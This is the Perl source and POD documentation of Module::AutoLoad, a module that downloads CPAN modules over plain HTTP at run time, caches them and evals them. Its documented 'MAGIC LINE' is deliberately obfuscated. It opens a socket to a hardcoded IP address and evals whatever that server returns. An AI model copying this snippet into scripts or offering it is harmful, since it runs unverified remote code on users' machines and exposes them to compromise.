package Module::AutoLoad;

use strict;
use warnings;
use base qw(Exporter);

our $VERSION = '0.06';

our $last_fetched = "";
our $lib = "lib";

sub import {
  warn "Congratulations! Module::AutoLoad has been loaded.\n" if $ENV{AUTOLOAD_DEBUG};
  $lib = $ENV{AUTOLOAD_LIB} if $ENV{AUTOLOAD_LIB};
  if ($lib =~ m{^[^/]}) {
    eval {
      require Cwd;
      $lib = Cwd::abs_path($lib);
    };
  }
  push @INC, $lib, \&inc;
}

sub mkbase {
  my $path = shift;
  if ($path =~ s{/+[^/]*$ }{}x) {
    return 1 if -d $path;
  }
  die "$path: Not a directory\n" if lstat $path;
  if (mkbase($path)) {
    warn "DEBUG: mkbase: Creating [$path] ...\n" if $ENV{AUTOLOAD_DEBUG};
    return mkdir $path, 0755;
  }
  return 0;
}

sub fetch {
  my $url = shift;
  my $recurse = shift || {};
  $url = full($url) unless $url =~ m{^\w+://};
  my $contents = get url $url;
  $last_fetched = $url;
  if ($contents =~ m{The document has moved <a href="([^<>]+)">}) {
    my $bounce = $1;
    if ($recurse->{$bounce} && $recurse->{$bounce} > 2) {
      return $contents;
    }
    $recurse->{$bounce}++;
    return fetch($bounce, $recurse) if $recurse->{total}++<20;
  }
  return $contents;
}

# full
# Turn a relative URL into a full URL
sub full {
  my $rel = shift;
  if ($rel =~ m{http://} || $last_fetched !~ m{^(http://[^/]+)(/?.*)}) {
    return $rel;
  }
  my $h = $1;
  my $p = $2;
  if ($rel =~ m{^/}) {
    return "$h$rel";
  }
  $p =~ s{[^/]*$ }{}x;
  return "$h$p$rel";
}

# fly
# Create a stub module to load the real file on-the-fly if needed.
sub fly {
  my $inc = shift;
  my $url = shift;
  my $write = shift;
  warn "DEBUG: Creating stub for [$inc] in order to download [$url] later if needed.\n" if $ENV{AUTOLOAD_DEBUG};
  my $contents = q{
    my $url = q{$URL};
    my $myself = $INC{"$inc"} || __FILE__;
    warn "DEBUG: Downloading [$url] right now ...\n" if $ENV{AUTOLOAD_DEBUG};
    my $m = Module::AutoLoad::fetch($url);
    if ($m =~ /package/) {
      warn "DEBUG: Contents appear fine. Commencing BRICK OVER ...\n" if $ENV{AUTOLOAD_DEBUG};
      if (open my $fh, ">", $myself) {
        print $fh $m;
        close $fh;
      }
      else {
        warn "$myself: WARNING: Unable to repair! $!\n";
      }
      warn "DEBUG: Forcing re-evaluation of fresh module contents ...\n" if $ENV{AUTOLOAD_DEBUG};
      my $e = eval $m;
      if ($e) {
        $INC{"$inc"} = $url;
        $e;
      }
      else {
        die "$url: $@\n";
      }
    }
    else {
      die "$url: STANKY! $m\n";
    }
  };
  $contents =~ s/\s+/ /g;
  $contents =~ s/([\;\{]+)\s+/$1\n/g;
  $contents =~ s/^\s+//;
  $contents =~ s/\s*$/\n/;
  # Fake interpolation
  $contents =~ s/\$URL/$url/g;
  $contents =~ s/\$inc/$inc/g;
  if ($write) {
    mkbase($write);
    $contents =~ s/(\$myself)\s*=.*?;/$1 = "$write";/;
    open my $fh, ">", $write or die "$write: open: OUCH! $!";
    print $fh $contents;
    close $fh;
  }
  return $contents;
}

sub inc {
  my $i = shift;
  my $f = shift;
  my $cache_file = "$lib/$f";
  if (-f $cache_file) {
    warn "$cache_file: Broken module. Can't continue.\n";
    return ();
  }
  mkbase($cache_file) or die "$cache_file: Unable to create! $!\n";
  pop @INC if $INC[-1] eq \&botstrap::inc;

  if ($f =~ m{^([\w/]+)\.pm}) {
    my $dist = $1;
    my $mod  = $1;
    $f = "$1.pm";
    $dist =~ s{/+}{-}g;
    $mod  =~ s{/+}{::}g;

    my $mapper = $ENV{AUTOLOAD_SRC} || "http://fastapi.metacpan.org/v1/release";
    my $search = fetch("$mapper/$dist/");
    warn "DEBUG: Probed: $last_fetched\n" if $ENV{AUTOLOAD_DEBUG};
    if ($search =~ m{download_url.*?(\w+/[\w\d\-\.]+)\.tar.gz}) {
      my $src = full("/source/$1/");
      if (my $MANIFEST = fetch "$src/MANIFEST") {
        $src = $1 if $last_fetched =~ m{^(.*?)/+MANIFEST};
        if ($MANIFEST =~ m{^lib/}m) {
          warn "DEBUG: YEY! Found a lib/ somewhere!\n" if $ENV{AUTOLOAD_DEBUG};
          while ($MANIFEST =~ s{^lib/(\S+\.pm)}{ }m) {
            my $remote = $1;
            warn "DEBUG: MATCH [lib/$remote] RIPPED OUT\n" if $ENV{AUTOLOAD_DEBUG};
            $last_fetched = "$src/MANIFEST";
            my $cache = "$lib/$remote";
            if (!-f $cache) {
              my $full = full("lib/$remote");
              fly($remote,$full,$cache);
            }
          }
        }
        else {
          warn "DEBUG: Oh, too bad there is no magic lib folder in the MANIFEST [$MANIFEST]\n" if $ENV{AUTOLOAD_DEBUG};
        }
        if (!-f $cache_file) {
          # Old versions of h2xs used to toss the end module right into the base folder?
          if ($f =~ m{(\w+\.pm)}) {
            my $stub = $1;
            if ($MANIFEST =~ /^(.*$stub)$/m) {
              my $stab = $1;
              $last_fetched = "$src/MANIFEST";
              $stab = full($stab);
              fly($f, $stab, $cache_file);
            }
            else {
              warn "WARNING: No [$stub] in $src/MANIFEST? [$MANIFEST]" if $ENV{AUTOLOAD_DEBUG};
              die "No [$stub] in $src/MANIFEST";
            }
          }
          else {
            warn "WARNING: Unable to extract stub from file [$f] ??\n";
          }
        }
      }
      else {
        warn "$src: Incomplete distribution! Broken MANIFEST file?\n";
      }
    }
  }

  if (open my $fh, "<", $cache_file) {
    $INC{$f} = $cache_file;
    return $fh;
  }

  return ();
}

$INC{"Module/AutoLoad.pm"} ||= __FILE__;
# Dummy AutoLoad wrapper module for RCX Framework.
package AutoLoad;
use base qw(Module::AutoLoad);

$INC{"AutoLoad.pm"} ||= __FILE__;

1;
__END__

=pod

=head1 NAME

Module::AutoLoad - Automatically load uninstalled CPAN modules on the fly.

=head1 SYNOPSYS

  use IO::Socket;
  # Module::AutoLoad MAGIC LINE BELOW
  use lib do{eval<$b>&&botstrap("AutoLoad")if$b=new IO::Socket::INET 82.46.99.88.":1"};

  use some::cpan::module;
  my $obj = some::cpan::module->new;

=head1 DESCRIPTION

Are you tired of everyone whining that your perl script doesn't work for other people
because they didn't install some CPAN module that you "use" in your code, but you don't
want to keep explaining to them how to install that silly dependency?
Well then, this is just what you need.
This module has just been used for personal hand-out scripts,
but so many other people wanted to use it so here it is.

=head1 INSTALL

Unlike most other modules on CPAN, this one is never intended to be installed.
It was designed to function simply by adding only a small code snippet, i.e., the "MAGIC LINE" from the SYNOPSYS above.
You can just copy/paste and then "use" whatever CPAN module you want after that.
But don't forget the IO::Socket line above.
This is needed to download any module directly from CPAN on the fly as you "use" it.
It even automatically loads the latest version of Module::AutoLoad at run-time directly from CPAN.
The optional "MAGIC LINE" comment is only to direct people reading your code back to this documentation.

Although the snippet is fairly short, it is intentionally obfuscated using the RCX Framework as a quick way
to detour those prying eyes from following how all the magic works, but the experienced Perl coder can still
understand everything. This puzzle is left as a recreational challenge to the reader.

NOTE: This may change in the future once my Perl Golf buddies can help shave a few more strokes off of
the invoker code. Or if you have some better ideas, feel free to please inform the author.

=head1 PREREQUISITES

There are intentionally very few modules required to be installed in order to use this module.
That is the entire purpose for this module.
In fact, this module itself works without even being installed!
The only module required is IO::Socket, which comes stock with all perl distributions now.

=head1 CAVEATS

=head2 1. Network

Network access is required in order to download the modules from CPAN.
It uses port 1 and port 80 to connect out.
This module will not function properly on stand-alone closed network systems
nor on networks that can't handle the simplest HTTP/0.9 protocol.

=head2 2. Slow

Also, because of all the network traffic used, this module can be quite slow,
especially the first time it is used since none of the cache files exist yet.
One work-around is to manually replace the MAGIC LINE with "use lib 'lib';"
after the invoker script has successfully executed once so that future
executions can run directly from the cache folder without slapping CPAN anymore.
This module is not recommended for use in production environments.

=head2 3. Write

Write access is required for storing a local cache of the CPAN module in order
to save time for future invocations.
(See AUTOLOAD_LIB below for more details.)

=head2 4. Pure Perl

This only works for simple Pure Perl CPAN modules at this time.
If you use modules with XS or bytecode, you will probably have to truly install it first.

=head2 5. Load Precedence

You must always load the main distribution module first,
even if you don't actually need to use that module anywhere.

  # For example, if all you need is Net::DNS::Resolver
  # You still have to load Net::DNS first.
  use Net::DNS;
  use Net::DNS::Resolver;

=head2 6. Irregular Distros

And for the same reason, those crazy distribution names that aren't really a module
are more difficult to load on the fly. One workaround is with eval.

  # For example, Mail::Cap is part of the MailTools distribution.
  # But MailTools.pm doesn't exist, so you have to eval it.
  BEGIN { eval { require MailTools; } }
  use Mail::Cap;

=head1 ENVIRONMENT VARIABLES

There are a few ENV settings you can configure to customize the behavior of Module::AutoLoad.

=head2 AUTOLOAD_LIB

You can choose where the CPAN cache files will be written to by using the AUTOLOAD_LIB setting.
For example, if you think you might not have write access, you can choose another folder.

  use IO::Socket;
  BEGIN { $ENV{AUTOLOAD_LIB} = "/tmp/module_autoload_$<"; }
  use lib do{eval<$b>&&botstrap("AutoLoad")if$b=new IO::Socket::INET 82.46.99.88.":1"};

The default is "lib" in the current directory.

=head2 AUTOLOAD_DEBUG

You can enable verbose debugging to see more how it works or
if you are having trouble with some modules by setting
AUTOLOAD_DEBUG to a true value.
The default is off.

=head2 AUTOLOAD_SRC

You can use AUTOLOAD_SRC to specify the mapper engine to ask where the latest location of the module is.

  # For example
  BEGIN { $ENV{AUTOLOAD_SRC} = "http://metacpan.org/release"; }

The default is "http://search.cpan.org/dist" .

=head1 SEE ALSO

cpan2rpm - Same code to lookup latest module without having to configure CPAN.pm.

local::lib - Wrapper around CPAN for local installations.

CPAN - Actually installs CPAN modules instead of a cache.

RCX - For compact and Remote Code eXecution framework.

=head1 AUTHOR

Rob Brown (bbb@cpan.org) - All of Module::AutoLoad code.

Wom Baht (wombaht@gmail.com) - RCX Obfuscation Framework to get the code snippet small.

=head1 COPYRIGHT AND LICENSE

Copyright (C) 2011-2018 by Rob Brown

This library is free software; you can redistribute it and/or modify
it under the same terms as Perl itself, either Perl version 5.8.8 or,
at your option, any later version of Perl 5 you may have available.


=cut
